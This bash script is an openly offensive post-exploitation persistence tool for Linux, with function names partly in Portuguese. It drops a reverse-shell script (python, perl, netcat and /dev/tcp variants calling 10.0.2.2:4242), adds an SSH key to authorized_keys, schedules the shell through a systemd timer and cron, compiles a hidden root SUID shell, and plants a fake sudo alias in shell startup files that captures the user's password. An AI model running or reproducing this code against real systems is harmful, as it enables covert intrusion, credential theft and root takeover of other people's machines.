#!/bin/bash

PUBKEY="ssh-rsa AAAADAQABAAABAQKIPelAdy/6YG8zWMc1YZXYf9boIZz2v48aq9BSVr3vBMhUj02Du6TZ2BMckLqGa4lqCIkfTlZ4Zk"
LHOST="10.0.2.2"
PORT="4242"

function reverse_shells(){
echo "[+] installing reverse shells executable"
cat << EOF > /dev/shm/upowrd
#!/bin/bash
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$LHOST",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;\$i="$LHOST";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $PORT >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/$LHOST/$PORT 0>&1
        exit;
fi
EOF
chmod +x /dev/shm/upowrd
}

function adiciona_key(){

	echo "[+] adding ssh key"
	if [ ! -f $HOME/.ssh/authorized_keys ];then mkdir $HOME/.ssh ;fi
	echo $PRIVKEY >> $HOME/.ssh/authorized_keys;

}

function instala_systemd_timer(){
if ! command -v systemctl &> /dev/null; then 
	echo "[-] systemctl command not found" && return 1; 
fi

echo "[+] installing systemd timer"

cat << EOF > /etc/systemd/system/upowrd.service
[Unit]
Description=server
After=network.target auditd.service
Wants=upowrd.timer

[Service]
Type=oneshot
ExecStart=/dev/shm/upowrd

[Install]
WantedBy=multi-user.target
EOF

cat << EOF > /etc/systemd/system/upowrd.timer
[Unit]
Description=system statistics
Requires=upowrd.service

[Timer]
Unit=upowrd.service
OnCalendar=*:0,5,10,15,20,25,30,35,40,45,50,55

[Install]
WantedBy=timers.target
EOF

systemctl enable upowrd
systemctl enable upowrd.timer
systemctl start upowrd.timer
}	

function criar_suid_bin(){
if ! command -v gcc &> /dev/null; then
	echo "[-] gcc command not found"
	return 1
fi
 
echo "[+] creating SUID binary"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > /tmp/.systemd-private-b21245afee3b3274d4b2e2128.c
gcc /tmp/.systemd-private-b21245afee3b3274d4b2e2128.c -o /tmp/.systemd-private-b21245afee3b3274d4b2e2128 2>/dev/null
rm /tmp/.systemd-private-b21245afee3b3274d4b2e2128.c
chown root:root /tmp/.systemd-private-b21245afee3b3274d4b2e2128
chmod 4777 /tmp/.systemd-private-b21245afee3b3274d4b2e2128
}

function backdoor_bashrc_privesc(){
echo "[+] adding sudo backdoor on $USER .bashrc"
cat << EOF > /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s

alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && $(sed -i "/sudo/d" $HOME/.bashrc) ; locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ $locale = "en" ]; then echo -n "[sudo] password for $USER: ";fi;if [ $locale = "pt" ]; then echo -n "[sudo] senha para $USER: ";fi;if [ $locale = "fr" ]; then echo -n "[sudo] Mot de passe de $USER: ";fi;read -s pwd;echo;echo "$pwd" > /dev/shm/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "$pwd" | /usr/bin/sudo -S chmod u+s $(which python) > /tmp/c 2>/dev/null &&/usr/bin/sudo -S '
EOF

if [ -f ~/.bashrc ]; then
    cat /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s >> ~/.zshrc
fi
rm -f /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s
}

function adiciona_cronjob(){
if ! command -v crontab &> /dev/null; then
	echo "[-] crontab command not found"
	return 1
fi
echo "[+] adding crontab"
crontab -l | { cat; echo "*/5 * * * * /bin/bash /dev/shm/upowrd"; } | crontab -
}

if [ "$EUID" -eq 0 ]; then
	reverse_shells
	adiciona_key
	instala_systemd_timer
	criar_suid_bin
fi
echo "Adding persistences to $USER..."
reverse_shells
backdoor_bashrc_privesc
adiciona_key
adiciona_cronjob

